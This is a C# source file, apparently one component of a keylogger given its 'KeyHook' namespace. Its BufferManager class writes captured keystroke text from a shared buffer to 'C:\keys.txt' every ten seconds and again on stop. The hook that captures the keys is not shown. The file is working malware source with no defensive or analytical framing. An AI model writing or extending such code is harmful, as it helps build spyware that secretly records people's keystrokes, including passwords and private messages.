using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;

namespace KeyHook
{
    public class BufferManager
    {
        private const string FILE_PATH = "C:\\keys.txt";
        private const int TIMER_INTERVAL = 10000;

        private Timer timer = null;

        public BufferManager()
        {
        }
    
        public void Start()
        {
            if (timer == null)
            {
                timer = new Timer(new TimerCallback(OnTick), null, 0, TIMER_INTERVAL);
            }
        }

        public void Stop()
        {
            if (timer != null)
            {
                timer.Dispose();
                ForceWrite();
            }
        }

        public void ForceWrite()
        {
            FileBuffer buffer = null;
            using (StreamWriter writer = new StreamWriter(FILE_PATH, true))
            {
                buffer = FileBuffer.GetInstance();
                writer.Write(buffer.CurrentStream.ToString());
                buffer.CurrentStream.Clear();
            }
        }

        private static void OnTick(Object state)
        {
            FileBuffer buffer = null;
            using (StreamWriter writer = new StreamWriter(FILE_PATH, true))
            {
                buffer = FileBuffer.GetInstance();
                writer.Write(buffer.CurrentStream.ToString());
                buffer.CurrentStream.Clear();
            }
        }

    }
}
